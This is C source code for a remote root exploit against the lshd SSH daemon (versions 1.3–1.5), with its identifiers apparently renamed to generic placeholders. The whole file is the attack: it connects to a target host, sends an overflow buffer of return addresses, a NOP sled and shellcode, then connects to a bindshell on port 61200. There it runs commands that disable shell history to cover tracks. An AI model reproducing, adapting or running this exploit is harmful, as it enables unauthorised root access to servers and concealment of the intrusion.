
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* platform; int elen; int nlen; int ret; } ;


 int FUNC_0 (char*) ;
 char* VAR_0 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int) ;
 int * FUNC_5 (char*) ;
 int * VAR_1 ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (int,char*,int,int ) ;
 int FUNC_9 (int,char*,int,int ) ;
 char* VAR_2 ;
 int FUNC_10 (int) ;
 int FUNC_11 (char*) ;
 TYPE_1__* VAR_3 ;

FUNC_12(int VAR_4, char **VAR_5)
{
 int VAR_6,VAR_7,VAR_8,VAR_9,VAR_10;
 unsigned long *VAR_11;
 char *VAR_12;
 int VAR_13 = 22;

 FUNC_7("\nlshd 1.3-1.5 remote root exploit by m00 security // www.m00.ru\n\n");
 if (VAR_4 < 3) {
  FUNC_7("Incorrect parameters. Usage: %s <target host> <target type> [port (22 default)]\n\nWhere 'target type' is:\n\n",VAR_5[0]);
  for(VAR_8=0;VAR_3[VAR_8].platform;VAR_8++) {
   FUNC_7("\r%i %s\n", VAR_8, VAR_3[VAR_8].platform);
  }
  FUNC_7("\n");
  FUNC_3(0);
 } else {
  VAR_9 = FUNC_0(VAR_5[2]);
  if(VAR_5[3]) { VAR_13 = FUNC_0(VAR_5[3]); }
 }

 if((VAR_1=FUNC_5(VAR_5[1]))==((void*)0)) {
  FUNC_7("[-] Couldn't resolve host %s\n", VAR_5[1]);
  FUNC_3(1);
 }

 FUNC_7("[~] Connecting to %s:%i...", VAR_5[1],VAR_13);
 if((VAR_10=FUNC_2(VAR_13))==-1) {
  FUNC_7(" failed\n");
  FUNC_3(1);
 }
 FUNC_7(" OK\n");

 FUNC_7("[~] Waiting for lshd response... ");
 FUNC_8(VAR_10, VAR_0, 8095, 0);
 FUNC_7(" OK\n");

 FUNC_7("=> %s",VAR_0);
 FUNC_7("[~] Building and sending exploit buffer...");
 VAR_11=(unsigned long *)VAR_0;
 for(VAR_8=0;VAR_8<VAR_3[VAR_9].elen;VAR_8++) {
  *(VAR_11++) = VAR_3[VAR_9].ret;
 }
 for(VAR_8=0;VAR_8<VAR_3[VAR_9].nlen;VAR_8++) {
  *(VAR_11++)=(unsigned long)0x90909090;
 }
 VAR_12=(unsigned char *)VAR_11;
 FUNC_6(VAR_12, VAR_2, FUNC_11(VAR_2));
 *(VAR_12+FUNC_11(VAR_2))='\n';
 FUNC_9(VAR_10,VAR_0,FUNC_11(VAR_0),0);
 FUNC_1(VAR_10);

 FUNC_7(" OK\n[~] Sleeping...\n");
 FUNC_10(1);
 FUNC_7("[~] Trying to connect to bindshell...");
 if((VAR_6=FUNC_2(61200))==-1)
  FUNC_7(" error\n[-] Could not connect to %s:61200 - exploit failed\n\n", VAR_5[1]);
 else {
  FUNC_7(" OK\n[+] Shell spawned! w00t!!!\n\n");
  FUNC_9(VAR_6,"export HISTFILE=/dev/null;id;uname -a;uptime;\n",46,0);
  FUNC_4(VAR_6);
 }
 FUNC_3(0);
}
